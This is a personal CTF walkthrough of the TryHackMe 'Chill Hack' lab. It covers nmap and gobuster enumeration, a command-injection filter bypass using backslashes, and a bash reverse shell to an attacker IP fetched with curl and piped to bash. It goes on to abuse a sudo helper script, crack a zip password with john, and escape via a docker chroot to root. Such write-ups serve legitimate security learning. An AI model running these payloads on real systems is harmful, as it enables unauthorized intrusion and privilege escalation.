---
title: "Chill Hack"
date: 2025-01-28
slug: chill-hack
tags: [tryhackme, linux, web, privesc]
difficulty: Easy
---
**enumeration**  


IP = 10.10.38.232

 ```
nmap -sCV 10.10.38.232

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.26.44
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Game Info
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

ftp , ssh , http allowed 

ftp anon login allowed 

ftp server has a note.txt 
```
❯ cat note.txt
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```


IP change = 10.10.12.157

```
❯ gobuster dir -u http://10.10.12.157 -w ~/ctf/wordlist/directory-list-2.3-medium.txt -x php,html,js

/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/news.html            (Status: 200) [Size: 19718]
/images               (Status: 301) [Size: 313] [--> http://10.10.12.157/images/]
/contact.php          (Status: 200) [Size: 0]
/contact.html         (Status: 200) [Size: 18301]
/about.html           (Status: 200) [Size: 21339]
/index.html           (Status: 200) [Size: 35184]
/blog.html            (Status: 200) [Size: 30279]
/css                  (Status: 301) [Size: 310] [--> http://10.10.12.157/css/]
/team.html            (Status: 200) [Size: 19868]

/fonts                (Status: 301) [Size: 312] [--> http://10.10.12.157/fonts/]
/secret               (Status: 301) [Size: 313] [--> http://10.10.12.157/secret/]
```

gobuster scan reveals 
/secret - has a box to execute any command which executes few commands but most important commands cant be executed and the output is not shown 



using pwd 
![[Pasted image 20250122224017.png]]

using ls -al
![[Pasted image 20250122224032.png]]

there is some filtering going in the code we are sending and to bypass this we can use cheatsheet to bypass command filtering 

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection

using `ls` we got error page but if we use backslash `l\s` we get 
![[Pasted image 20250122230519.png]]
so the command filtering bypass is possible 

using `c\at index.php`
we get the index.php page with valuable information in the inspect part 
```
<!--?php
        if(isset($_POST['command']))
        {
                $cmd = $_POST['command'];
                $store = explode(" ",$cmd);
                $blacklist = array('nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls');
                for($i=0; $i<count($store); $i++)
                {
                        for($j=0; $j<count($blacklist); $j++)
                        {
                                if($store[$i] == $blacklist[$j])
				{?-->
```

so the blacklist we have is 
nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls'


---

**exploitation**


all of them blacklist the use of reverse shell 

technique we will use to bypass this will be 

1. making a script that runs the bash rev shell command
```
  ❯ cat script.sh
bash -c "bash -i >& /dev/tcp/10.17.26.44/9999 0>&1"
```
 2. setup a listner 
  ```
 ❯ rlwrap nc -lnvp 9999
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
```


 3. host a python server get the file and directly run it using bash 
```
❯ python -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/)
```

` curl 10.17.26.44:8888/script.sh | ba\sh`
takes the script and runs it directly with bash without getting it blacklisted 

```
❯ rlwrap nc -lnvp 9999
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 10.10.12.157.
Ncat: Connection from 10.10.12.157:39284.
bash: cannot set terminal process group (1100): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html/secret$ ls
ls
images
index.php
www-data@ubuntu:/var/www/html/secret$ whoami
whoami
www-data
```
we got revshell in the server 

```
www-data@ubuntu:/var/www/html/secret$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```


```
cat .helpline.sh
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```
this code runs a code provided at second time and it can be run by apaar permissions so we can use it to read the user file 

```
www-data@ubuntu:/home/apaar$ sudo -u apaar ./.helpline.sh
sudo -u apaar ./.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

whoami
cat local.txt
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
Thank you for your precious time!
www-data@ubuntu:/home/apaar$ 
```




```
www-data@ubuntu:/var/www/files$ ls
ls
account.php
hacker.php
images
index.php
style.css
```

in the hacker.php we find text that 
```
You have reached this far.
Look in the dark! You will find your answer
```



```
www-data@ubuntu:/var/www/files$ cat index.php
cat index.php
<html>
<body>
<?php
	if(isset($_POST['submit']))
	{
		$username = $_POST['username'];
		$password = $_POST['password'];
		ob_start();
		session_start();
		try
		{
			$con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");
			$con->setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_WARNING);
		}
		catch(PDOException $e)
		{
			exit("Connection failed ". $e->getMessage());
		}
		require_once("account.php");
		$account = new Account($con);
		$success = $account->login($username,$password);
		if($success)
		{
			header("Location: hacker.php");
		}
	}
?>
<link rel="stylesheet" type="text/css" href="style.css">
	<div class="signInContainer">
		<div class="column">
			<div class="header">
				<h2 style="color:blue;">Customer Portal</h2>
				<h3 style="color:green;">Log In<h3>
			</div>
			<form method="POST">
				<?php echo $success?>
                		<input type="text" name="username" id="username" placeholder="Username" required>
				<input type="password" name="password" id="password" placeholder="Password" required>
				<input type="submit" name="submit" value="Submit">
        		</form>
		</div>
	</div>
</body>
</html>
```
We use these credentials to gain access to the database `webportal`, where we were able to obtain encrypted credentials from users:
`PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");`

IP change = 10.10.186.32

```
www-data@ubuntu:/var/www/files$ mysql -u root -p
mysql -u root -p
Enter password: !@m+her00+@db
```
*this was not working idk why* 

lets do steganography on the hacker.jpg img for that we will download it using commands 

in the img directory we will start a python server 
```
www-data@ubuntu:/var/www/files/images$ python3 -m http.server 9988
python3 -m http.server 9988

```

on our machine we ill use wget command to get the image 
```
❯ wget http://10.10.238.50:9988/hacker-with-laptop_23-2147985341.jpg
Saving 'hacker-with-laptop_23-2147985341.jpg'
HTTP response 200 OK [http://10.10.238.50:9988/hacker-with-laptop_23-2147985341.jpg]
hacker-with-laptop_2 100% [============================================================================================>]   67.22K    --.-KB/s
                          [Files: 1  Bytes: 67.22K [87.64KB/s] Redirects: 0  Todo: 0  Errors: 0       
```


extract secrets using stegseek 
```
❯ stegseek extract -sf hacker-with-laptop_23-2147985341.jpg

StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""

[i] Original filename: "backup.zip".
[i] Extracting to "hacker-with-laptop_23-2147985341.jpg.out".
```
the contents are in a jpg.out file we need to change the name of the file to .zip and use zip the john for further cracking process 

```
❯ mv hacker-with-laptop_23-2147985341.jpg.out backup.zip

❯ ../john/run/zip2john backup.zip > hash
```

cracking the hash 
```
❯ ../john/run/john hash -w=../wordlist/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Note: Passwords longer than 21 [worst case UTF-8] to 63 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
pass1word        (backup.zip/source_code.php)     
1g 0:00:00:00 DONE (2025-01-27 23:34) 25.00g/s 409600p/s 409600c/s 409600C/s 123456..christal
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
password - pass1word

now we got the password to crack the zip 
```
❯ unzip backup.zip
Archive:  backup.zip
[backup.zip] source_code.php password: 
  inflating: source_code.php         
❯ ls
backup.zip  chillhack  hacker-with-laptop_23-2147985341.jpg  hash  meme.jpg  script.sh  source_code.php  wlist.txt
```
we got one file which is source_code.php 
the sourcecode had a authentication system which had a base64 password auth cracking that we get the password as -`!d0ntKn0wmYp@ssw0rd`
trying to use this password on the server accounts 


by this password we may try to get accounts of other users in the server 
also the su commands need a pty shell 

```
www-data@ubuntu:/home$ su anurodh
su anurodh
su: must be run from a terminal
www-data@ubuntu:/home$ python -c "import pty;pty.spawn('/bin/bash')"



www-data@ubuntu:/home$ su anurodh
su anurodh
Password: !d0ntKn0wmYp@ssw0rd

anurodh@ubuntu:/home$ 
```

----


**PrivEsc**

```
anurodh@ubuntu:~$ sudo -l
sudo -l
Matching Defaults entries for anurodh on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User anurodh may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
anurodh@ubuntu:~$ id
id
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
```
we see that anurodh is a part of a docker group which is a potential priv esc vector 

using GTFObins  - https://gtfobins.github.io/gtfobins/docker/#sudo

```
anurodh@ubuntu:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# cat /root/proof.txt

```



user flag -- `{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}`

root flag -- `{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}`



----

Learnings for me  --
- reading of the html code correctly may have some uname or pass 
- stegseek tools usage (some work to do)
- docker privesc
- how to bypass command filtering usage of backslash
